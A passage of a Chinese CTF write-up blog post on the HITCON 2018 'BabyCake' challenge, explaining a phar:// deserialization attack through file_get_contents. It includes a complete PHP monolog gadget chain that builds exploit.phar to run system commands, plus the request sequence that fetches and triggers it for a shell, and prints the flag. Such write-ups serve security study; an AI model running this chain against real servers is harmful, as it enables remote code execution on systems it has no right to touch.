+<p>2018 年特别火的一个考点就是 phar:// 的反序列化漏洞问题。而 file_get_contents 确实也可以造成<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2958">反序列化</a>。那么本题解题思路出来了：</p>
+<ol type="1">
+<li>首先需要一台 VPS。利用请求将恶意 phar 文件保存在 cache 中。</li>
+<li>然后发出 POST 请求，最终使 file_get_contents () 触发 cache 中的 phar RCE。</li>
+</ol>
+<p>  思路明确了，但是我们要找一个能够触发反序列化漏洞的点。这时不妨回去看看 composer.json。其中 monolog/monolog 这个包有点引人注意，它曾经确实的出现过反序列化漏洞，去找一下信息，题目所安装的版本也确实存在这个漏洞。那么直接写这个 Payload 就好了。Github 上有。构造如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Monolog</span>\<span class="title">Handler</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">SyslogUdpHandler</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">socket</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$x</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;socket = $x;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BufferHandler</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $handler;</span><br><span class="line">        <span class="keyword">protected</span> $bufferSize = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">protected</span> $buffer;</span><br><span class="line">        <span class="comment"># ($record[&#x27;level&#x27;] &lt; $this-&gt;level) == false</span></span><br><span class="line">        <span class="keyword">protected</span> $level = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">protected</span> $initialized = <span class="literal">true</span>;</span><br><span class="line">        <span class="comment"># ($this-&gt;bufferLimit &gt; 0 &amp;&amp; $this-&gt;bufferSize === $this-&gt;bufferLimit) == false</span></span><br><span class="line">        <span class="keyword">protected</span> $bufferLimit = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">protected</span> $processors;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$methods, $command</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;processors = $methods;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;buffer = [$command];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;handler = <span class="keyword">clone</span> <span class="keyword">$this</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    $<span class="title">cmd</span> = &quot;<span class="title">ls</span> -<span class="title">alt</span>&quot;; <span class="comment">//Modify here.</span></span><br><span class="line"></span><br><span class="line">    $obj = <span class="keyword">new</span> \Monolog\Handler\SyslogUdpHandler(</span><br><span class="line">        <span class="keyword">new</span> \Monolog\Handler\BufferHandler(</span><br><span class="line">            [<span class="string">&#x27;current&#x27;</span>, <span class="string">&#x27;system&#x27;</span>],</span><br><span class="line">            [$cmd, <span class="string">&#x27;level&#x27;</span> =&gt; <span class="literal">null</span>]</span><br><span class="line">        )</span><br><span class="line">    );</span><br><span class="line">    </span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">&#x27;exploit.phar&#x27;</span>);</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;addFromString(<span class="string">&#x27;test&#x27;</span>, <span class="string">&#x27;test&#x27;</span>);</span><br><span class="line">    $phar-&gt;setStub(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>);</span><br><span class="line">    $phar-&gt;setMetadata($obj);</span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>  将生成的 exploit.phar 放到服务器上，然后在题目页面上进行如下操作： <div class="mermaid">
+
+A[&quot;使用 GET 方式访问 http:&#x2F;&#x2F;XXX.XXX.XXX.XXX&#x2F;?url&#x3D;http:&#x2F;&#x2F;YYY.YYY.YYY.YYY&#x2F;exploit.phar&quot;] --&gt; B
+B[&quot;使用 POST 方式访问 &#96;http:&#x2F;&#x2F;XXX.XXX.XXX.XXX&#x2F;?url&#x3D;http:&#x2F;&#x2F;YYY.YYY.YYY.YYY&amp;data[test\]&#x3D;@phar:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;tmp&#x2F;cache&#x2F;mycache&#x2F;CLIENT_IP&#x2F;MD5(http:&#x2F;&#x2F;IP&#x2F;exploit.phar)&#x2F;body.cache&quot;]
+</div>   这样就可以 Getshell 了。</p>
+
+    <div id="aplayer-ADiJHPUq" class="aplayer aplayer-tag-marker meting-tag-marker"
+         data-id="1394897325" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="true" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#ad7a86" data-loop="all"
+    ></div>
+<p>flag{851489de-10d6-450b-b8f9-479bfd2e4dd5}</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>Tiaonmmn.ZMZ
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="http://tiaonmmn.github.io/2019/05/15/HITCON2018-BabyCake/" title="HITCON2018-BabyCake">http://tiaonmmn.github.io/2019/05/15/HITCON2018-BabyCake/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nd/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-ND</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/Unserialize/" rel="tag"><i class="fa fa-tag"></i> Unserialize</a>
+              <a href="/tags/Web/" rel="tag"><i class="fa fa-tag"></i> Web</a>
+              <a href="/tags/CakePHP/" rel="tag"><i class="fa fa-tag"></i> CakePHP</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2019/05/14/FireShell2019-Vice/" rel="prev" title="FireShell2019-Vice">
+                  <i class="fa fa-chevron-left"></i> FireShell2019-Vice
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2019/05/15/Insomni-hack-teaser-2019-Phuck2/" rel="next" title="Insomni-hack-teaser-2019-Phuck2">
+                  Insomni-hack-teaser-2019-Phuck2 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+  
+  
+  
+
+
+
+      
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      const activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      const commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+    </div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+      
+
+      
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">flag{Lorem_ipsum}</span>
+</div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+      <span>站点总字数：</span>
+    <span title="站点总字数">296k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span>站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">4:29</span>
+  </span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script size="300" alpha="0.6" zIndex="-1" src="//cdn.jsdelivr.net/npm/ribbon.js@1.0.2/dist/ribbon.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/animejs@3.2.0/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  
+
+
+
+
+  <script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+<script>
+document.querySelectorAll('.pdfobject-container').forEach(element => {
+  const url = element.dataset.target;
+  const pdfOpenParams = {
+    navpanes : 0,
+    toolbar  : 0,
+    statusbar: 0,
+    pagemode : 'thumbs',
+    view     : 'FitH'
+  };
+  const pdfOpenFragment = '#' + Object.entries(pdfOpenParams).map(([key, value]) => `${key}=${encodeURIComponent(value)}`).join('&');
+  const fullURL = `/lib/pdf/web/viewer.html?file=${encodeURIComponent(url)}${pdfOpenFragment}`;
+
+  if (NexT.utils.supportsPDFs()) {
+    element.innerHTML = `<embed class="pdfobject" src="${url + pdfOpenFragment}" type="application/pdf" style="height: ${element.dataset.height};">`;
+  } else {
+    element.innerHTML = `<iframe src="${fullURL}" style="height: ${element.dataset.height};" frameborder="0"></iframe>`;
+  }
+});
+</script>
+
+
+<script>
+if (document.querySelectorAll('.mermaid').length) {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/mermaid@8.7.0/dist/mermaid.min.js', () => {
+    mermaid.init({
+      theme    : 'forest',
+      logLevel : 3,
+      flowchart: { curve     : 'linear' },
+      gantt    : { axisFormat: '%m/%d/%Y' },
+      sequence : { actorMargin: 50 }
+    }, '.mermaid');
+  }, window.mermaid);
+}
+</script>
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+<script>
+NexT.utils.loadComments('#valine-comments', () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', () => {
+    new Valine(Object.assign({
+      el  : '#valine-comments',
+      path: "/2019/05/15/HITCON2018-BabyCake/",
+    }, {"enable":true,"appId":"rGe4J3rLO75By3sjYfktvsyD-MdYXbMMI","appKey":"bpXDIRUBmowvz9tnMhIj6zs7","placeholder":"Just go go","avatar":"mm","meta":["nick","mail","link"],"pageSize":10,"lang":"zh-cn","visitor":false,"comment_count":true,"recordIP":true,"serverURLs":null,"enableQQ":true,"requiredFields":[]}
+    ));
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
